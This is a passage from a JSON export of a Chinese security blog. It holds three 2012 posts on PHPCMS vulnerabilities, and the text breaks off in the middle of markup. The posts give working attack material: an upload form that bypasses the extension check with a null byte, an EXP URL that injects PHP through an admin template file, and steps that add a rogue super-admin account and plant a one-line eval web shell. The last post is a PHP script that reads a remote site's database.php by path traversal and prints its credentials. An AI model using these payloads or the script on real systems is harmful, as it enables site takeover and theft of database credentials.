enctype=&quot;multipart/form-data&quot;\naction=&quot;http://localhost/phpcms/yp/business/?file=\n../../admin/upload&amp;C[upload_allowext]=php|Php%00.|php%00&amp;dosubmit=yes&quot; \nmethod=\"post\">;\n<h1>Upload a new file:</h1>\n&lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&gt;&lt;br&gt;\n&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;\n&lt;/form>\n```\n## 传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。\n## 漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，\n看名字貌似是跟模块有关的，难不成可以写个shell ?\n## 猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。\n## 看144行左右，当$action 等于 post时。\n\n```php\ncase 'post':\n require_once 'template.func.php';\n if($func == 'dosave') ## 这里完全不用管他，让他进入else\n {\n $block-&gt;set_template($blockid, $template);\n $block-&gt;update($blockid, $data);\n $data = $block-&gt;get_html($blockid);\n }\n else\n {\n $name = new_stripslashes($name);\n $data = new_stripslashes($data);\n $data = $block-&gt;strip_data($data);\n $template = new_stripslashes($template);\n $tpldata = template_parse($template);\n $tplfile = TPL_CACHEPATH.'block_'.$blockid.'.preview.php'; ## 文件名\n file_put_contents($tplfile, $tpldata); ## 生成文件\n include $tplfile; ## 包含文件\n @unlink($tplfile); ## 删除刚才生成的文件\n $data = ob_get_contents();\n ob_clean();\n }\n echo '&lt;script language=&quot;JavaScript&quot;&gt;parent.'.$func.'('.$blockid.',\n &quot;'.format_js($data, 0).'&quot;);&lt;/script&gt;';\n break;\n```\n\n## 在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，\n#只要能控制php文件的内容，代码还是会被执行。\n## 看取得文件内容的这一行，$tpldata = template_parse($template); \n#跟进template_parse函数\n\n```php\nfunction template_parse($str, $istag = 0)\n{\n $str = preg_replace(&quot;/([nr]+)t+/s&quot;,&quot;1&quot;,$str);\n $str = preg_replace(&quot;/&lt;!--{(.+?)}--&gt;/s&quot;,\n &quot;{1}&quot;,$str);\n $str = preg_replace(&quot;/{templates+(.+)}/&quot;,\n&quot;&lt;?php include template(1); ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{includes+(.+)}/&quot;,\n&quot;&lt;?php include 1; ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{phps+(.+)}/&quot;,\n&quot;&lt;?php 1?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{ifs+(.+?)}/&quot;,\n&quot;&lt;?php if(1) { ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{else}/&quot;,&quot;&lt;?php } else { ?&gt;&quot;\n,$str);\n $str = preg_replace(&quot;/{elseifs+(.+?)}/&quot;,&quot;&lt;?php } elseif (1) { ?&gt;&quot;,\n$str);\n $str = preg_replace(&quot;/{/if}/&quot;,&quot;&lt;?php } ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{loops+(S+)s+(S+)}/&quot;,&quot;&lt;?php \nif(is_array(1))foreach(1 AS 2) { ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{loops+(S+)s+(S+)s+(S+)}/&quot;,&quot;&lt;?php \nif(is_array(1)) foreach(1 AS 2 =&gt; 3) { ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{/loop}/&quot;,&quot;&lt;?php } ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{/get}/&quot;,&quot;&lt;?php } unset($DATA); ?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{tag_([^}]+)}/e&quot;, &quot;get_tag('1')&quot;, $str);\n $str = preg_replace(&quot;/{gets+([^}]+)}/e&quot;, &quot;get_parse('1')&quot;, $str);\n $str = preg_replace(&quot;/{([a-zA-Z_x7f-xff][a-zA-Z0-9_x7f-xff:]\n*(([^{}]*)))}/&quot;,&quot;&lt;?php echo 1;?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{$([a-zA-Z_x7f-xff][a-zA-Z0-9_x7f-xff:]\n*(([^{}]*)))}/&quot;,&quot;&lt;?php echo 1;?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{($[a-zA-Z_x7f-xff][a-zA-Z0-9_x7f-xff]*)}/&quot;,\n&quot;&lt;?php echo 1;?&gt;&quot;,$str);\n $str = preg_replace(&quot;/{($[a-zA-Z0-9_[]'&quot;$x7f-xff]+)}/es&quot;,\n &quot;addquote('&lt;?php echo 1;?&gt;')&quot;,$str);\n $str = preg_replace(&quot;/{([A-Z_x7f-xff][A-Z0-9_x7f-xff]*)}/s&quot;,\n &quot;&lt;?php echo 1;?&gt;&quot;,$str);\n if(!$istag) $str = &quot;&lt;?php defined('IN_PHPCMS') or exit('Access Denied');\n ?&gt;&quot;.$str;\n return $str;\n}\n```\n## 是用来处理一些模板语法，完全不用理会。\n```shell\nEXP:http://localhost/yp/business/?file=../../\nadmin/block&amp;action=post&amp;blockid=eval&amp;template=&lt;?php phpinfo();exit();?&gt;\n```\n[![](http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg \"phpcms2008\")](http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg)\n\n其实我觉得之前的那个注入漏洞比较严重~\n","slug":"phpcms-2008多个漏洞-可getshell","updated":1421659126000,"excerpt":"<p>本文转自乌云：<a href=\"http://www.wooyun.org/bugs/wooyun-2010-09563\" target=\"_blank\" rel=\"external\">http://www.wooyun.org/bugs/wooyun-2010-09563</a><br>[php]</p>\n<h3 id=\"文件包含\">文件包含</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">define(<span class=\"string\">'IN_YP'</span>, <span class=\"keyword\">TRUE</span>);</div><div class=\"line\">define(<span class=\"string\">'ADMIN_ROOT'</span>, str_replace(&quot;&quot;, <span class=\"string\">'/'</span>,dirname(<span class=\"keyword\">__FILE__</span>)).<span class=\"string\">'/'</span>);</div><div class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'../include/common.inc.php'</span>;</div></pre></td></tr></table></figure>\n\n<h2 id=\"要登陆\">要登陆</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$_userid</span>) showmessage(<span class=\"string\">'您还没有登陆，即将跳转到登陆页面'</span>,</div><div class=\"line\"><span class=\"variable\">$MODULE</span>[<span class=\"string\">'member'</span>][<span class=\"string\">'url'</span>].<span class=\"string\">'login.php?forward='</span>.urlencode(URL));</div><div class=\"line\">session_start();</div></pre></td></tr></table></figure>\n\n<h2 id=\"$file变量可控制\">$file变量可控制</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>) || <span class=\"keyword\">empty</span>(<span class=\"variable\">$file</span>)) <span class=\"variable\">$file</span> = <span class=\"string\">'panel'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* $company_user_infos 获取企业会员信息 */</span></div><div class=\"line\"><span class=\"variable\">$company_user_infos</span> = <span class=\"variable\">$db</span>-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;member_company` </div><div class=\"line\">WHERE `userid`=<span class=\"string\">'$_userid'</span>&quot;);</div><div class=\"line\"><span class=\"variable\">$userid</span> = <span class=\"variable\">$_userid</span>;</div></pre></td></tr></table></figure>\n\n","_id":"s7xb1n9mhlkbqj3y","comments":true,"layout":"post","photos":[],"link":""},{"title":"PHPcmsV9任意文件读取漏洞拿Shell","id":171,"date":1343500417000,"tags":["qvyaixa0ffh607ss","jkk1hzi0kjnqyh4p"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i","ynqi3ufxo1cdml3c"],"content":"<p>前几天爆的phpcmsV9任意文件读取漏洞，其实危害是很大的，但往往还是一些管理员</p>\n<p>觉得漏洞并不可怕，听到某人说道，即使是被人读取了数据库数据也没用，为啥，因为</p>\n<p>他权限数据库权限单库单用户，并且v9制作前台cms发布里面就只有管理员账户并且不发</p>\n<p>分子拿到密码也没用因为破解不了他的密码，其实我想说你丫的把黑阔当傻子？你能想到</p>\n<p>的别人想不到，废话就不说了，看着就是了~~</p>\n<p>本地搭建的phpcsmV9.现用漏洞或者工具读取数据库信息：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg\" alt=\"\" title=\"v9shell_1\"></a></p>\n<p><a id=\"more\"></a><br>数据库phpcmsv9用户名：root  密码为空</p>\n<p>我们用一款数据库管理工具连接数据库我用的是navicat</p>\n<p>打开工具点击连接-mysql配置数据库信息如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg\" alt=\"\" title=\"v9shell_2\"></a></p>\n<p>打开phpcmsV9数据库并且找到admin表，向表中添加一条数据，因为我们没法破解他的密码那么咱们就自己</p>\n<p>添加一个用户以便能够登录后台操作：</p>\n<blockquote>\n<p>Username:admin password: 748b4dfa3a7159c1eb1baa46f222f9b8 roleid:1 encrypt:C6mB9p</p>\n</blockquote>\n<p>注意这几项必须添负责登录不了的。应为这条记录的意思是添加用户名为admin,密码为：creturn.com的超级管理员</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg\" alt=\"\" title=\"v9shell_3\"></a></p>\n<blockquote>\n<p>后台登录地址：localhost/index.php?m=admin</p>\n<p>用户名：admin 密码：creturn.com</p>\n</blockquote>\n<p>登录后台后我们找到界面-》模版风格-》选择默认模版点击详情列表</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_41.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_41-1024x163.jpg\" alt=\"\" title=\"v9shell_4\"></a></p>\n<p>然后点击里面的search目录下面的index.html右侧的编辑</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg\" alt=\"\" title=\"v9shell_5\"></a></p>\n<p>修改其模版为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span> <span class=\"variable\">$shell</span> = <span class=\"string\">'&lt;?php @eval($_POST[cmd]);'</span>;file_put_contents(<span class=\"string\">'shell.php'</span>,<span class=\"variable\">$shell</span>);<span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>提交保存</p>\n<p>然后访问：localhost/index.php?m=search</p>\n<p>会在根目录生成一个shell.php的一句话，我们连接看看</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg\" alt=\"\" title=\"v9shell_6\"></a></p>\n<p>可以看到已经拿到shell，记得把修改的模版改回去。</p>\n<p>至此，如果还有管理员认为这个漏洞是鸡肋，那我就无话可说了！</p>\n<p>最近发现有人那我写的Exp改作者名和版权信息后发到自己的站上，等我有时间了会光顾你们的！</p>\n","source":"_posts/phpcmsv9任意文件读取漏洞拿shell.md","raw":"title: \"PHPcmsV9任意文件读取漏洞拿Shell\"\nid: 171\ndate: 2012-07-29 02:33:37\ntags: \n- phpcmsv9漏洞\n- webshell\ncategories: \n- 原创作品\n- 技术文章\n- 最新漏洞\n---\n\n前几天爆的phpcmsV9任意文件读取漏洞，其实危害是很大的，但往往还是一些管理员\n\n觉得漏洞并不可怕，听到某人说道，即使是被人读取了数据库数据也没用，为啥，因为\n\n他权限数据库权限单库单用户，并且v9制作前台cms发布里面就只有管理员账户并且不发\n\n分子拿到密码也没用因为破解不了他的密码，其实我想说你丫的把黑阔当傻子？你能想到\n\n的别人想不到，废话就不说了，看着就是了~~\n\n本地搭建的phpcsmV9.现用漏洞或者工具读取数据库信息：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg \"v9shell_1\")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg)\n\n<!--more-->\n数据库phpcmsv9用户名：root  密码为空\n\n我们用一款数据库管理工具连接数据库我用的是navicat\n\n打开工具点击连接-mysql配置数据库信息如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg \"v9shell_2\")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg)\n\n打开phpcmsV9数据库并且找到admin表，向表中添加一条数据，因为我们没法破解他的密码那么咱们就自己\n\n添加一个用户以便能够登录后台操作：\n\n>Username:admin password: 748b4dfa3a7159c1eb1baa46f222f9b8 roleid:1 encrypt:C6mB9p\n\n注意这几项必须添负责登录不了的。应为这条记录的意思是添加用户名为admin,密码为：creturn.com的超级管理员\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg \"v9shell_3\")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg)\n\n>后台登录地址：localhost/index.php?m=admin\n\n>用户名：admin 密码：creturn.com\n\n登录后台后我们找到界面-》模版风格-》选择默认模版点击详情列表\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_41-1024x163.jpg \"v9shell_4\")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_41.jpg)\n\n然后点击里面的search目录下面的index.html右侧的编辑\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg \"v9shell_5\")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg)\n\n修改其模版为：\n\n```php\n<?php $shell = '<?php @eval($_POST[cmd]);';file_put_contents('shell.php',$shell);?>\n```\n\n提交保存\n\n然后访问：localhost/index.php?m=search\n\n会在根目录生成一个shell.php的一句话，我们连接看看\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg \"v9shell_6\")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg)\n\n可以看到已经拿到shell，记得把修改的模版改回去。\n\n至此，如果还有管理员认为这个漏洞是鸡肋，那我就无话可说了！\n\n最近发现有人那我写的Exp改作者名和版权信息后发到自己的站上，等我有时间了会光顾你们的！\n","slug":"phpcmsv9任意文件读取漏洞拿shell","updated":1421659126000,"excerpt":"<p>前几天爆的phpcmsV9任意文件读取漏洞，其实危害是很大的，但往往还是一些管理员</p>\n<p>觉得漏洞并不可怕，听到某人说道，即使是被人读取了数据库数据也没用，为啥，因为</p>\n<p>他权限数据库权限单库单用户，并且v9制作前台cms发布里面就只有管理员账户并且不发</p>\n<p>分子拿到密码也没用因为破解不了他的密码，其实我想说你丫的把黑阔当傻子？你能想到</p>\n<p>的别人想不到，废话就不说了，看着就是了~~</p>\n<p>本地搭建的phpcsmV9.现用漏洞或者工具读取数据库信息：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg\" alt=\"\" title=\"v9shell_1\"></a></p>\n<p>","_id":"mflbiwe8m84wugvk","comments":true,"layout":"post","photos":[],"link":""},{"title":"phpcmsV9最新任意读文件漏洞利用工具","id":159,"date":1343154988000,"tags":["qvyaixa0ffh607ss","qjs410ib2s97hdlo"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i","ynqi3ufxo1cdml3c"],"content":"<p><span style=\"color: #ff0000;\">注意：本程序带有攻击性，仅供学习研究请勿当作非法工具使用，否则后果自负，</span><span style=\"color: #ff0000;\">于本人无关！</span></p>\n<p>睡觉前去论坛上面看了下，爆出 phpcmsV9最新任意读文件漏洞 ，第一反映就是</p>\n<p>完了，估计互联网上又不知道多少万用户数据被脱了~~</p>\n<p>自己就写了一个此漏洞的检测工具方便站长们检测自己的站点是否存在漏洞。</p>\n<p>代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * PHPcms V9 任意文件读取漏洞检测工具</div><div class=\"line\"> *<span class=\"phpdoc\"> @author</span> Return Blog: www.creturn.com</div><div class=\"line\"> * Email: master@creturn.com</div><div class=\"line\"> *</div><div class=\"line\"> * 注意本程序仅供学习参考，不得用于非法互动</div><div class=\"line\"> * 否则后果自负，与本人无关！</div><div class=\"line\"> */</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">showInfo</span><span class=\"params\">()</span> </span>{</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'</span></div><div class=\"line\">***********************************************</div><div class=\"line\">* PHPcmsV9 Read All File ExpTool By: Return</div><div class=\"line\">*</div><div class=\"line\">* Blog: www.creturn.com</div><div class=\"line\">*</div><div class=\"line\">* Email:master@creturn.com</div><div class=\"line\">*</div><div class=\"line\">* Example: php exp.php wwww.phpcms.cn</div><div class=\"line\">***********************************************</div><div class=\"line\">';</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$exp</span> = <span class=\"string\">'/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//file_get_contents(''.$exp);</span></div><div class=\"line\"><span class=\"keyword\">if</span>(count(<span class=\"variable\">$argv</span>) &lt; <span class=\"number\">2</span>){</div><div class=\"line\"> showInfo();</div><div class=\"line\">}<span class=\"keyword\">else</span>{</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$exp</span> = <span class=\"string\">'http://'</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>].<span class=\"variable\">$exp</span>;</div><div class=\"line\"> <span class=\"variable\">$data</span> = @file_get_contents(<span class=\"variable\">$exp</span>);</div><div class=\"line\"> @file_put_contents(<span class=\"string\">'expDatabase.php'</span>, <span class=\"variable\">$data</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(strstr(<span class=\"variable\">$data</span>,<span class=\"string\">'&lt;html&gt;'</span>)){</div><div class=\"line\"> showInfo();</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'Not found !'</span>;</div><div class=\"line\"> <span class=\"keyword\">exit</span>();</div><div class=\"line\"> };</div><div class=\"line\"> <span class=\"variable\">$database</span> = <span class=\"keyword\">include</span> <span class=\"string\">'expDatabase.php'</span>;</div><div class=\"line\"> showInfo();</div><div class=\"line\"> <span class=\"variable\">$out</span> = <span class=\"string\">'HostName: '</span>.<span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'hostname'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"variable\">$out</span> .=<span class=\"string\">'DataBase:'</span>. <span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'database'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"variable\">$out</span> .=<span class=\"string\">'UserName:'</span>. <span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'username'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"variable\">$out</span> .=<span class=\"string\">'Password:'</span>. <span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'password'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$database</span>)){</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">\"Found it! :nn\"</span>;</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"variable\">$out</span>;</div><div class=\"line\"> }</div><div class=\"line\"> @unlink(<span class=\"string\">'expDatabase.php'</span>);</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>国内第一名校，你懂得~~ ：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/phpcmsV9.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/phpcmsV9.jpg\" alt=\"\" title=\"phpcmsV9\"></a></p>\n","source":"_posts/phpcmsv9最新任意读文件漏洞利用工具.md","raw":"title: \"phpcmsV9最新任意读文件漏洞利用工具\"\nid: 159\ndate: 2012-07-25 02:36:28\ntags: \n- phpcmsv9漏洞\n- 任意读取文件漏洞\ncategories: \n- 原创作品\n- 技术文章\n- 最新漏洞\n---\n\n<span style=\"color: #ff0000;\">注意：本程序带有攻击性，仅供学习研究请勿当作非法工具使用，否则后果自负，</span><span style=\"color: #ff0000;\">于本人无关！</span>\n\n睡觉前去论坛上面看了下，爆出 phpcmsV9最新任意读文件漏洞 ，第一反映就是\n\n完了，估计互联网上又不知道多少万用户数据被脱了~~\n\n自己就写了一个此漏洞的检测工具方便站长们检测自己的站点是否存在漏洞。\n\n代码：\n\n```php\n<?php\n/**\n * PHPcms V9 任意文件读取漏洞检测工具\n * @author Return Blog: www.creturn.com\n * Email: master@creturn.com\n *\n * 注意本程序仅供学习参考，不得用于非法互动\n * 否则后果自负，与本人无关！\n */\n\nfunction showInfo() {\n\nprint '\n***********************************************\n* PHPcmsV9 Read All File ExpTool By: Return\n*\n* Blog: www.creturn.com\n*\n* Email:master@creturn.com\n*\n* Example: php exp.php wwww.phpcms.cn\n***********************************************\n';\n}\n\n$exp = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php';\n\n//file_get_contents(''.$exp);\nif(count($argv) &lt; 2){\n showInfo();\n}else{\n\n $exp = 'http://'.$argv[1].$exp;\n $data = @file_get_contents($exp);\n @file_put_contents('expDatabase.php', $data);\n if(strstr($data,'&lt;html&gt;')){\n showInfo();\n echo 'Not found !';\n exit();\n };\n $database = include 'expDatabase.php';\n showInfo();\n $out = 'HostName: '.$database['default']['hostname'].\"n\";\n $out .='DataBase:'. $database['default']['database'].\"n\";\n $out .='UserName:'. $database['default']['username'].\"n\";\n $out .='Password:'. $database['default']['password'].\"n\";\n if(!empty($database)){\n echo \"Found it! :nn\";\n echo $out;\n }\n @unlink('expDatabase.php');\n}\n```\n<!--more-->\n\n国内第一名校，你懂得~~ ：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/phpcmsV9.jpg \"phpcmsV9\")](http://asset.creturn.com/asset/uploads/2012/07/phpcmsV9.jpg)\n","slug":"phpcmsv9最新任意读文件漏洞利用工具","updated":1421659126000,"excerpt":"<p><span style=\"color: #ff0000;\">注意：本程序带有攻击性，仅供学习研究请勿当作非法工具使用，否则后果自负，</span><span style=\"color: #ff0000;\">于本人无关！</span></p>\n<p>睡觉前去论坛上面看了下，爆出 phpcmsV9最新任意读文件漏洞 ，第一反映就是</p>\n<p>完了，估计互联网上又不知道多少万用户数据被脱了~~</p>\n<p>自己就写了一个此漏洞的检测工具方便站长们检测自己的站点是否存在漏洞。</p>\n<p>代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * PHPcms V9 任意文件读取漏洞检测工具</div><div class=\"line\"> *<span class=\"phpdoc\"> @author</span> Return Blog: www.creturn.com</div><div class=\"line\"> * Email: master@creturn.com</div><div class=\"line\"> *</div><div class=\"line\"> * 注意本程序仅供学习参考，不得用于非法互动</div><div class=\"line\"> * 否则后果自负，与本人无关！</div><div class=\"line\"> */</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">showInfo</span><span class=\"params\">()</span> </span>{</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'</span></div><div class=\"line\">***********************************************</div><div class=\"line\">* PHPcmsV9 Read All File ExpTool By: Return</div><div class=\"line\">*</div><div class=\"line\">* Blog: www.creturn.com</div><div class=\"line\">*</div><div class=\"line\">* Email:master@creturn.com</div><div class=\"line\">*</div><div class=\"line\">* Example: php exp.php wwww.phpcms.cn</div><div class=\"line\">***********************************************</div><div class=\"line\">';</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$exp</span> = <span class=\"string\">'/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//file_get_contents(''.$exp);</span></div><div class=\"line\"><span class=\"keyword\">if</span>(count(<span class=\"variable\">$argv</span>) &lt; <span class=\"number\">2</span>){</div><div class=\"line\"> showInfo();</div><div class=\"line\">}<span class=\"keyword\">else</span>{</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$exp</span> = <span class=\"string\">'http://'</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>].<span class=\"variable\">$exp</span>;</div><div class=\"line\"> <span class=\"variable\">$data</span> = @file_get_contents(<span class=\"variable\">$exp</span>);</div><div class=\"line\"> @file_put_contents(<span class=\"string\">'expDatabase.php'</span>, <span class=\"variable\">$data</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(strstr(<span class=\"variable\">$data</span>,<span class=\"string\">'&lt;html&gt;'</span>)){</div><div class=\"line\"> showInfo();</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'Not found !'</span>;</div><div class=\"line\"> <span class=\"keyword\">exit</span>();</div><div class=\"line\"> };</div><div class=\"line\"> <span class=\"variable\">$database</span> = <span class=\"keyword\">include</span> <span class=\"string\">'expDatabase.php'</span>;</div><div class=\"line\"> showInfo();</div><div class=\"line\"> <span class=\"variable\">$out</span> = <span class=\"string\">'HostName: '</span>.<span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'hostname'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"variable\">$out</span> .=<span class=\"string\">'DataBase:'</span>. <span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'database'</span>].<span 